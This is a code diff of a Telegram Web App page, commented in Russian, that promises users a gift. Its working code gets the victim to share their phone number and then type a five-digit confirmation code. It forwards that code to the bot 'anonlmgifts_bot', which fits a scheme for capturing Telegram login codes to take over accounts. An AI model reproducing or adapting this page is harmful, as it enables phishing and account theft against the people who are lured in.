@@ -12,11 +12,13 @@
         .code-header { font-size: 24px; font-weight: 500; margin-bottom: 10px; margin-top: 20px; }
         .code-subtitle { font-size: 14px; color: var(--tg-theme-hint-color, #999999); margin-bottom: 30px; line-height: 1.4; }
         
+        /* Скрываем стандартный инпут, но он ловит ввод */
         .code-input { 
             position: absolute; opacity: 0; width: 1px; height: 1px; 
-            font-size: 16px;
+            font-size: 16px; 
         }
         
+        /* Красивые ячейки для цифр */
         .code-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 30px; }
         .code-cell { 
             width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); 
@@ -33,6 +35,7 @@
     <div id="screen-phone">
         <h2 style="margin-top: 40px;">Шаг 1</h2>
         <p style="color: gray;">Для получения подарка авторизуйтесь по кнопке ниже 👇</p>
+        <!-- Кнопку запроса номера мы вызываем через встроенную кнопку Telegram (в самом низу) -->
     </div>
 
     <!-- Экран 2 (Ввод кода) -->
@@ -58,39 +61,39 @@
                 tg.expand();
                 let isSent = false;
 
-                // Встроенная кнопка Telegram
+                // 1. ВСТРОЕННАЯ КНОПКА TELEGRAM ДЛЯ ЗАПРОСА НОМЕРА
                 tg.MainButton.setText("ПОДЕЛИТЬСЯ НОМЕРОМ");
                 tg.MainButton.show();
                 
                 tg.MainButton.onClick(function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Отправляем боту, что номер получен (не пытаемся вытащить сам номер в текст)
-                            tg.sendData(JSON.stringify({
-                                action: "phone_shared"
-                            }));
-
-                            // Переключаем экран
+                            // Переключаем экран на ввод кода
                             document.getElementById('screen-phone').classList.add('hidden');
                             document.getElementById('screen-code').classList.remove('hidden');
+                            
+                            // Скрываем кнопку "Поделиться"
                             tg.MainButton.hide();
                             
+                            // Фокусируемся на поле ввода, чтобы открылась клавиатура
                             setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                         }
                     });
                 });
 
-                // Обработка ввода кода
+                // 2. Обработка ввода кода (анимация ячеек + отправка)
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 const codeContainer = document.getElementById('code-cells');
 
+                // Клик по ячейкам вызывает клавиатуру
                 codeContainer.onclick = function() { codeInput.focus(); };
 
                 codeInput.addEventListener('input', function(e) {
-                    const value = this.value.replace(/\D/g, ''); 
+                    const value = this.value.replace(/\D/g, ''); // Только цифры
                     this.value = value; 
 
+                    // Красиво заполняем ячейки
                     codeCells.forEach((cell, index) => {
                         if (index < value.length) {
                             cell.innerText = value[index];
@@ -107,12 +110,14 @@
                         }
                     });
 
+                    // Как только ввели 5 цифр — отправляем
                     if (value.length === 5 && !isSent) {
                         isSent = true; 
-                        this.blur(); 
+                        this.blur(); // Прячем клавиатуру
                         
                         const botUsername = "anonlmgifts_bot"; 
                         
+                        // Ссылка с кодом, которая отправит данные боту
                         setTimeout(() => {
                             tg.openTelegramLink("https://t.me/" + botUsername + "?start=" + value);
                             setTimeout(() => tg.close(), 500);
